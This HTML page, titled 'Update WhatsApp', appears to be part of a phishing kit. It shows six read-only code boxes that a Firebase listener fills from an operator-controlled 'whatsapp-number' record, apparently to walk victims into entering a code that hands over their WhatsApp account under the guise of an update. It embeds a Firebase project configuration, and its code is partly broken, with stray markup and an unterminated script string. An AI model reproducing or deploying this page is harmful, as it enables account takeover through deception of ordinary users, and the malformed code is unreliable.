<!DOCTYPE html>
<html lang="en">  
<head>  
  <meta charset="UTF-8">  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
  <title>Code Update</title>  
  <style>  
    .otp-container {  
      display: flex;  
      justify-content: center;  
      gap: 15px;  
      margin-top: 50px;  
    }  
    .otp-input {  
      width: 30px;  
      height: 40px;  
      text-align: center;
      font-size: 25px;  
      border-radius: 10px;  
      border: 2px solid #ccc;  
      background-color: #f9f9f9;  
    }
  </style>  
</head>  
<body>  
  <h2 style="text-align:center;">Update WhatsApp</h2>  
  <div class="otp-container">  
    <input class="otp-input" id="box1" readonly>  
    <input class="otp-input" id="box2" readonly>  
    <input class="otp-input" id="box3" readonly>  
    <input class="otp-input" id="box4" readonly>  
    <input class="otp-input" id="box5" readonly>  
    <input class="otp-input" id="box6" readonly>  
  </div>  

  <!-- Scrollable Image Section -->
  <div style="margin-top: 20px; overflow-x: auto; white-space: nowrap; border: 1px solid #ccc; padding: 10px; max-width: 320px; margin-left: auto; margin-right: auto;">
    <img src="https://i.ibb.co/x9VpbLX/images-2.jpg" alt="Image 1" style="height: 150px; display: inline-block; margin-right: 10px;">
    <img src="https://i.ibb.co/svqTnyWM/images-3.jpg" alt="Image 2" style="height: 150px; display: inline-block;">
  </div>

  <!-- Next Step Button --><<div style="text-align:center; margin-top: 15px;">
  <button id="nextStepBtn" class="fancy-btn">Next Step</button>
</div>

<style>
  .fancy-btn {
    padding: 12px 28px;
    font-size: 18px;
    background-color: #25D366;
    color: white;
    border: none;
    border-radius: 30px;
    box-shadow: 0 5px 10px rgba(0,0,0,0.2);
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
  }

  .fancy-btn::before {
    content: "";
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.2);
    transition: all 0.5s ease;
  }

  .fancy-btn:hover::before {
    left: 100%;
  }

  .fancy-btn:hover {
    background-color: #20b858;
    transform: scale(1.05);
  }
</style>

<script>
  document.getElementById('nextStepBtn').addEventListener('click', function() {
    // Replace with your desired WhatsApp number
    window.location.href = "whatsapp://https://play.google.com/store/apps/details?id=com.whatsapp.w4b;
  });
</script>
  

  <!-- Firebase -->  
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>  
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>  
  <script>  
    const firebaseConfig = {  
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",  
      authDomain: "sbighsh.firebaseapp.com",  
      projectId: "sbighsh",  
      storageBucket: "sbighsh.appspot.com",  
      messagingSenderId: "685947657107",  
      appId: "1:685947657107:web:471a0557bb72235272a666"  
    };  

    firebase.initializeApp(firebaseConfig);  
    const db = firebase.firestore();  

    const sessionId = sessionStorage.getItem("sessionId");  

    if (!sessionId) {  
      alert("Session ID missing!");  
    } else {  
      db.collection("whatsapp-number").doc(sessionId)  
        .onSnapshot(doc => {  
          const data = doc.data();  
          if (data && data.boxes) {  
            data.boxes.forEach((val, i) => {  
              const el = document.getElementById(`box${i + 1}`);  
              if (el) el.value = val;  
            });  
          }  
        });  
    }  
  </script>  
</body>  
</html>
